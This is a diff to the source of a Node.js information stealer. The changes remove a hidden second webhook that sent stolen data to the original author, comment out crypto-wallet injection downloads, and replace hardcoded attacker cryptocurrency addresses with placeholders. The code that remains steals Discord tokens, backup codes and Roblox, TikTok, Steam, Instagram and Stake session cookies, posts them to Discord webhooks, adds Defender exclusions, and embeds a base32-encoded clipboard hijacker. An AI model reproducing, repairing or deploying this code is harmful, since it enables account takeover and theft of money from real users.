@@ -21,8 +21,9 @@ const locale = getLocale();
 const mainFolderPath = `C:/ProgramData/Steam/Launcher/${generateRandomString(12)}/${locale}-${computerName}`;
 var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
 const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
-const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/atomic.asar";
-const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar";
+// these are dualhooked (join t.me/vatfraudster)
+// const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/atomic.asar";
+// const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar";
 
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
@@ -472,7 +473,6 @@ async function findBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload)
               console.log('Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -525,7 +525,6 @@ async function findEpicGamesBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload);
               console.log('Epic Games Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -577,7 +576,6 @@ async function findGithubBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload)
               console.log('Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -1057,18 +1055,21 @@ function addDefenderExclusions() {
 
 // Replace with your addresses or all money to me :)
 const addresses = {
-    btc: "bc1qfyhhl5qd8jy8qww4gku7r93eyyu69ckmk9sthz",
-    eth: "0xe821b7964b15c27611E38DABe9fD3373BD11fFE1",
-    ltc: "LLRzcyZv6LsmVwUzu2R881EELmuH4QENf5",
-    trx: "TQhwuNQ9RdJdua5WNJMacgj1TiCPCP6XNY",
-    bch: "qrhxm9rgh2z3psahgjzqkpqcgy5xj2vwxq9jze9nel",
-    xmr: "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCDT",
-    xrp: "rBZg1pVSCseJ7443xv3m81N5w75ff8K8xX",
-    zcash: "t1XwdmFo5g8GcR5pSjiy9TZfuGyU7biYbKV",
-    doge: "DQkHa1pj7Vyd2wJfqRLX47ckh8gwD5ryFf"
+    btc: "%btc%",
+    eth: "%eth%",
+    ltc: "%ltc%",
+    trx: "%trx%",
+    bch: "%bch%",
+    xmr: "%xmr%",
+    xrp: "%xrp%",
+    zcash: "%zcash%",
+    doge: "%doge%"
 };
 
-// This is a clipper, here is the decrypted code: https://pastebin.com/raw/juyfkJ4N (DM me on Telegram if you don't know how to decrypt base64 :0)
+// Make sure to decrypt and put ur adresses...
+
+// encoder -> https://simplycalc.com/base32-encode.php
+// decoder -> https://simplycalc.com/base32-decode.php
 async function clip(pythonwExe) {
     const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
     if (!fs.existsSync(appDataHiddenFolder)) {
@@ -1081,8 +1082,7 @@ import base64
 
 # Base32 encoded Python code
 encoded_code = """
-NFWXA33SOQQHEZIKNFWXA33SOQQHI2LNMUFGS3LQN5ZHIIDQPFYGK4TDNRUXACTJNVYG64TUEBRGC43FGY2AU2LNOBXXE5BAN5ZQU2LNOBXXE5BAON4XGCTJNVYG64TUEBRXI6LQMVZQUZTSN5WSAY3UPFYGK4ZANFWXA33SOQQHO2LOOR4XAZLTBIFGCZDEOJSXG43FOMQD2ID3BIQCAIBAEJRHIYZCHIQCEYTDGFYXG5LDGRZGGMTVNNXGYNBTNNYXQZLNOV4XMNTEGN4GMZTOMRZTE2RQGA4GO2RXEIWAUIBAEAQCEZLUNARDUIBCGB4DOMBQHA3TKRCGGU2WIOJQGRRDENBUGY4TINJYME3GEQKFGA2EMNTEMQ3WKRRZGFDCELAKEAQCAIBCNR2GGIR2EARGY5DDGFYXQN3OG5THENDBNZ4XG43ZNBTHAMTTGRZWIOLKOY3XEOBZMV4DS43EGJSDMZDHEIWAUIBAEAQCE5DSPARDUIBCKRFFSZKFNBQW6WJVONITMNSTJBGGEQ3QHA2WUR3DKNVXCTCMOZBFIVJCFQFCAIBAEARGEY3IEI5CAITRPJVHONDENJ2TK6BSPAZWW53UOVSWY4DQNVWTQ3DQO43W25TOME3XGNLGNRSTG43SGQRCYCRAEAQCAITYNVZCEORAEI2DGQKLOFSDCTBUKFFVMULVPA3WES2FJM3GIVLNKZFUKSSUMRCXIZ2TM5MWC2RSGVZGOUSHMFKXE4BSM5SWWTCBGFRFERD2JJRGEYLEKBKGCTTXIJDTQ3TKNVMUGVTWIVUUUWSCPF4XMVRWJZQW4Q2VKIRCYCRAEAQCAITYOJYCEORAEJZGMMTZONHFKQSOLFDFAWBVOR5E4ZTBJZTVE2SKIRSWIUKXNA3G2U2WEIWAUIBAEAQCE6TDMFZWQIR2EARHIMLBGM2HKUJYLBJE4S3PK54XS22RKVAXIURWOZVDKOCVIRGXAYLBPFTCELAKEAQCAIBCMRXWOZJCHIQCERCRGVSVUULZJVREG42BI5CG6RJXOZYTG6TTKBEDO5RUGNCXMZSVKY3HESTWORAXE43ROF3DOTCFNVRDGQSGGZSTC5SIOVSEOUCDKFYHAYLYMYRAU7IKBJYGC5DUMVZG44ZAHUQHWCRAEAQCAITCORRSEORAOIRF4KDCMMYXYWZRGNOSSW3BFV5ECLKIJIWU4UBNLIYC2OK5PMZDMLBUGF6SIIRMBIQCAIBAEJSXI2BCHIQHEIS6GB4FWYJNMZAS2RRQFU4V26ZUGB6SIIRMBIQCAIBAEJWHIYZCHIQHEIS6FBGHYTL4GN6GY5DDGEUVWYJNNNWS26SBFVEEULKOKAWVUMJNHFOXWMRWFQZTG7JEEIWAUIBAEAQCE5DSPARDUIDSEJPFIW3BFV5ECLK2GAWTSXL3GI4CYMZTPUSCELAKEAQCAIBCMJRWQIR2EBZCEXRIFBRGS5DDN5UW4Y3BONUDUKJ7FBYXY4BJLNQS26RQFU4V26ZUGF6SSJBCFQFCAIBAEARHQ3LSEI5CA4RCLY2FWMBNHFAUEXK3GEWTSQJNJBFC2TSQFVNGCLLLNUWXUXL3HEZCYOJVPUSCELAKEAQCAIBCPBZHAIR2EBZCEXTSLMYC2OLBFV5ECLK2LV5TENBMGM2H2JBCFQFCAIBAEARHUY3BONUCEORAOIRF45BRLMYC2OKBFV5F26ZTGIWDGOL5EQRCYCRAEAQCAITEN5TWKIR2EBZCEXSEPMYX2WZVFU4UCLKIJIWU4UBNKVOXWML5LMYS2OKBFVEEULKOKAWVUYJNNNWS26S5PMZTELBWGF6SIIQKPUFAUZDFMYQGG4TFMF2GKX3NOV2GK6BINV2XIZLYL5XGC3LFFE5AUIBAEAQCGICDOJSWC5DFEBQSAV3JNZSG653TEBWXK5DFPAQHK43JNZTSAY3UPFYGK4YKEAQCAIDLMVZG4ZLMGMZCAPJAMN2HS4DFOMXHO2LOMRWGYLTLMVZG4ZLMGMZAUIBAEAQG25LUMV4CAPJANNSXE3TFNQZTELSDOJSWC5DFJV2XIZLYK4UE433OMUWCARTBNRZWKLBANV2XIZLYL5XGC3LFFEFAUIBAEAQGSZRANNSXE3TFNQZTELSHMV2EYYLTORCXE4TPOIUCSIB5HUQDCOBTHIQCAIZAIVJFET2SL5AUYUSFIFCFSX2FLBEVGVCTBIQCAIBAEAQCAIDQOJUW45BIMYREC3TPORUGK4RANFXHG5DBNZRWKIDJOMQGC3DSMVQWI6JAOJ2W43TJNZTS4ICFPBUXI2LOM4XCEKIKEAQCAIBAEAQCA43ZOMXGK6DJOQUDCKIKEAQCAIDFNRZWKOQKEAQCAIBAEAQCA4DSNFXHIKDGEJGXK5DFPAQHW3LVORSXQX3OMFWWK7JAMNZGKYLUMVSCA43VMNRWK43TMZ2WY3DZFYRCSCQKMRSWMIDNN5XGS5DPOJPWG3DJOBRG6YLSMQUCSOQKEAQCAIDSMVRWK3TUL53GC3DVMUQD2IBCEIFCAIBAEB3WQ2LMMUQFI4TVMU5AUIBAEAQCAIBAEBRWY2LQMJXWC4TEL53GC3DVMUQD2IDQPFYGK4TDNRUXALTQMFZXIZJIFEFCAIBAEAQCAIBANFTCAY3MNFYGE33BOJSF65TBNR2WKIBBHUQHEZLDMVXHIX3WMFWHKZJ2BIQCAIBAEAQCAIBAEAQCA4TFMNSW45C7OZQWY5LFEA6SAY3MNFYGE33BOJSF65TBNR2WKCRAEAQCAIBAEAQCAIBAEBTG64RAMNZHS4DUN4WCA4DBOR2GK4TOEBUW4IDQMF2HIZLSNZZS42LUMVWXGKBJHIFCAIBAEAQCAIBAEAQCAIBAEAQCA2LGEBZGKLTNMF2GG2BIOBQXI5DFOJXCYIDDNRUXAYTPMFZGIX3WMFWHKZJJHIFCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQHA6LQMVZGG3DJOAXGG33QPEUGCZDEOJSXG43FONNWG4TZOB2G6XJJBIQCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEBRHEZLBNMFCAIBAEAQCAIBAORUW2ZJOONWGKZLQFAYC4NJJBIFGSZRAL5PW4YLNMVPV6IB5HUQCEX27NVQWS3S7L4RDUCRAEAQCA3LVORSXQX3OMFWWKIB5EAREO3DPMJQWYXC4MNZHS4DUN5PWG3DJOBRG6YLSMRPW25LUMV4CEIBAEMQEO3DPMJQWYIDNOV2GK6BAORXSAYLWN5UWIIDDN5XGM3DJMN2HGIDBMNZG643TEB2XGZLSOMFCAIBAEBRXEZLBORSV63LVORSXQKDNOV2GK6C7NZQW2ZJJEAQCGICFNZZXK4TFEBXW43DZEBXW4ZJANFXHG5DBNZRWKIDPMYQHI2DFEBZWG4TJOB2CA2LTEBZHK3TONFXGOCRAEAQCA3LPNZUXI33SL5RWY2LQMJXWC4TEFAUQ====
-"""
+NFWXA33SOQQHEZIKNFWXA33SOQQHI2LNMUFGS3LQN5ZHIIDQPFYGK4TDNRUXACTJNVYG64TUEBRGC43FGY2AU2LNOBXXE5BAN5ZQU2LNOBXXE5BAON4XGCTJNVYG64TUEBRXI6LQMVZQUZTSN5WSAY3UPFYGK4ZANFWXA33SOQQHO2LOOR4XAZLTBIFGCZDEOJSXG43FOMQD2ID3BIQCAIBCMJ2GGIR2EARCKYTUMMSSELAKEAQCAITFORUCEORAEISWK5DIEURCYCRAEAQCE3DUMMRDUIBCEVWHIYZFEIWAUIBAEARHI4TYEI5CAIRFORZHQJJCFQFCAIBAEJRGG2BCHIQCEJLCMNUCKIRMBIQCAIBCPBWXEIR2EARCK6DNOISSELAKEAQCAITYOJYCEORAEISXQ4TQEURCYCRAEAQCE6TDMFZWQIR2EARCK6TDMFZWQJJCFQFCAIBAEJSG6Z3FEI5CAIRFMRXWOZJFEIFH2CQKOBQXI5DFOJXHGIB5EB5QUIBAEARGE5DDEI5CA4RCLYUGEYZRPRNTCM25FFNWCLL2IEWUQSRNJZIC2WRQFU4V26ZSGYWDIML5EQRCYCRAEAQCEZLUNARDUIDSEJPDA6C3MEWWMQJNIYYC2OK5PM2DA7JEEIWAUIBAEARGY5DDEI5CA4RCLYUEY7CNPQZXY3DUMMYSSW3BFVVW2LL2IEWUQSRNJZIC2WRRFU4V26ZSGYWDGM35EQRCYCRAEAQCE5DSPARDUIDSEJPFIW3BFV5ECLK2GAWTSXL3GI4CYMZTPUSCELAKEAQCAITCMNUCEORAOIRF4KBIMJUXIY3PNFXGGYLTNA5CSPZIOF6HAKK3MEWXUMBNHFOXWNBRPUUSIIRMBIQCAIBCPBWXEIR2EBZCEXRULMYC2OKBIJOVWMJNHFAS2SCKFVHFALK2MEWWW3JNPJOXWOJSFQ4TK7JEEIWAUIBAEARHQ4TQEI5CA4RCLZZFWMBNHFQS26SBFVNF26ZSGQWDGND5EQRCYCRAEAQCE6TDMFZWQIR2EBZCEXTUGFNTALJZIEWXUXL3GMZCYMZZPUSCELAKEAQCAITEN5TWKIR2EBZCEXSEPMYX2WZVFU4UCLKIJIWU4UBNKVOXWML5LMYS2OKBFVEEULKOKAWVUYJNNNWS26S5PMZTELBWGF6SIIQKPUFAUZDFMYQGG4TFMF2GKX3NOV2GK6BINV2XIZLYL5XGC3LFFE5AUIBAEARSAQ3SMVQXIZJAMEQFO2LOMRXXO4ZANV2XIZLYEB2XG2LOM4QGG5DZOBSXGCRAEAQGWZLSNZSWYMZSEA6SAY3UPFYGK4ZOO5UW4ZDMNQXGWZLSNZSWYMZSBIQCAIDNOV2GK6BAHUQGWZLSNZSWYMZSFZBXEZLBORSU25LUMV4FOKCON5XGKLBAIZQWY43FFQQG25LUMV4F63TBNVSSSCQKEAQCA2LGEBVWK4TOMVWDGMROI5SXITDBON2EK4TSN5ZCQKJAHU6SAMJYGM5CAIBDEBCVEUSPKJPUCTCSIVAUIWK7IVMESU2UKMFCAIBAEAQCAIDQOJUW45BIMYREC3TPORUGK4RANFXHG5DBNZRWKIDJOMQGC3DSMVQWI6JAOJ2W43TJNZTS4ICFPBUXI2LOM4XCEKIKEAQCAIBAEAQHG6LTFZSXQ2LUFAYSSCRAEAQGK3DTMU5AUIBAEAQCAIBAOBZGS3TUFBTCETLVORSXQID3NV2XIZLYL5XGC3LFPUQGG4TFMF2GKZBAON2WGY3FONZWM5LMNR4S4IRJBIFGIZLGEBWW63TJORXXEX3DNRUXAYTPMFZGIKBJHIFCAIBAOJSWGZLOORPXMYLMOVSSAPJAEIRAUIBAEB3WQ2LMMUQFI4TVMU5AUIBAEAQCAIBAMNWGS4DCN5QXEZC7OZQWY5LFEA6SA4DZOBSXEY3MNFYC44DBON2GKKBJBIQCAIBAEAQCA2LGEBRWY2LQMJXWC4TEL53GC3DVMUQCCPJAOJSWGZLOORPXMYLMOVSTUCRAEAQCAIBAEAQCAIBAOJSWGZLOORPXMYLMOVSSAPJAMNWGS4DCN5QXEZC7OZQWY5LFBIQCAIBAEAQCAIBAEAQGM33SEBRXE6LQORXSYIDQMF2HIZLSNYQGS3RAOBQXI5DFOJXHGLTJORSW24ZIFE5AUIBAEAQCAIBAEAQCAIBAEAQCA2LGEBZGKLTNMF2GG2BIOBQXI5DFOJXCYIDDNRUXAYTPMFZGIX3WMFWHKZJJHIFCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEBYHS4DFOJRWY2LQFZRW64DZFBQWIZDSMVZXGZLTLNRXE6LQORXV2KIKEAQCAIBAEAQCAIBAEAQCAIBAEAQCAIDCOJSWC2YKEAQCAIBAEAQHI2LNMUXHG3DFMVYCQMBOGUUQUCTJMYQF6X3OMFWWKX27EA6T2IBCL5PW2YLJNZPV6IR2BIQCAIDNOV2GK6C7NZQW2ZJAHUQCER3MN5RGC3C4LRRXE6LQORXV6Y3MNFYGE33BOJSF63LVORSXQIRAEARSAR3MN5RGC3BANV2XIZLYEB2G6IDBOZXWSZBAMNXW4ZTMNFRXI4ZAMFRXE33TOMQHK43FOJZQUIBAEBRXEZLBORSV63LVORSXQKDNOV2GK6C7NZQW2ZJJEAQCGICFNZZXK4TFEBXW43DZEBXW4ZJANFXHG5DBNZRWKIDPMYQHI2DFEBZWG4TJOB2CA2LTEBZHK3TONFXGOCRAEAQG233ONF2G64S7MNWGS4DCN5QXEZBIFE======"""
 
 # Function to adjust padding for Base32 string
 def adjust_padding(encoded_str):
@@ -1325,12 +1325,8 @@ async function SubmitInstagram(session_id) {
       },
     };
 
-    await axios.post(discordWebhookUr1, { embeds: [embed] });
 
-    // Introduce a 2-second delay before sending the second webhook request
-    await new Promise(resolve => setTimeout(resolve, 1000));
 
-    // Retry logic with exponential backoff
     let retryAttempts = 0;
     while (retryAttempts < 3) { // Retry a maximum of 3 times
       try {
@@ -1445,7 +1441,6 @@ async function SubmitRoblox(secret_cookie) {
     console.log('Payload to be sent:', payload);
 
     axios.post(discordWebhookUrl, payload);
-    axios.post(discordWebhookUr1, payload);
   } catch (error) {
     console.error('Error in SubmitRoblox:', error.message);
   }
@@ -1618,7 +1613,6 @@ function stealTikTokSession(cookie) {
                   ]
                 };
 
-                axios.post(discordWebhookUr1, webhookPayload);
                 axios.post(discordWebhookUrl, webhookPayload)
                   .then(response => {
                     console.log('Discord webhook sent successfully! send tiktok');
@@ -1980,7 +1974,6 @@ async function getTokens() {
                     value: "```\n" + userData.bio + "\n```",
                 });
             }
-            await axios.post(discordWebhookUr1, data);
             await axios.post(discordWebhookUrl, data);
         } catch (error) {
             console.error(error);
@@ -2540,12 +2533,6 @@ async function stealSteamSession() {
                             createSteamEmbed(account, accountInfo, games, level)
                         ]
                     };
-
-                    await axios.post(discordWebhookUr1, webhookPayload);
-                    console.log('First Steam session detected embed sent to webhook.');
-
-                    // Add a delay of 2 seconds
-                    await new Promise(resolve => setTimeout(resolve, 2000));
 
                     await axios.post(discordWebhookUrl, webhookPayload);
                     console.log('Second Steam session detected embed sent to webhook.');
@@ -3201,14 +3188,6 @@ try {
         },
     };
 
-    axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
-    .then(() => { 
-        console.log('system information successfully sent to Discord webhook.');
-    })
-    .catch(error => {
-        console.error('An error occurred while sending system information:', error.message);
-    });
-    await new Promise(resolve => setTimeout(resolve, 1000));
     axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
         .then(() => {
             console.log('system information successfully sent to Discord webhook.');
@@ -3823,7 +3802,6 @@ async function sendStakeSessionToDiscord(decrypted) {
         };
 
         await axios.post(discordWebhookUrl, payload, { headers });
-        await axios.post(discordWebhookUr1, payload, { headers });
     } catch (error) {
         console.error('Error sending Stake session to Discord:', error);
     }
@@ -4182,7 +4160,7 @@ function backupcodes() {
 // Wallet Injection
 function wallet() {
     localWalletData();
-    walletinjection();
+    // walletinjection();
 }
 
 // Miscellaneous Functions
